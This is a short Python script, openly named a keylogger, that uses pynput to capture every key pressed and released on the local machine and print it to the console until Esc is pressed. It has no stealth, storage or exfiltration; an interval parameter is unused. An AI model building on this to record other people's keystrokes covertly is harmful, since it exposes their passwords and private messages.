from pynput import keyboard

class KeyLogger():
    def __init__(self, interval) -> None:
        self.interval = interval

    def format_key(self, key):
        try:
            formatted_key = key.char
        except:
            formatted_key = key
        finally:
            return formatted_key

    def on_press(self, key):
        print(f"[PRESSED]: {self.format_key(key)}")
    
    def on_release(self, key):
        print(f"[RELEASED]: {self.format_key(key)}")
        if key == keyboard.Key.esc:
            return False
    
    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        with keyboard_listener:
            keyboard_listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(1)
    keylogger.run()
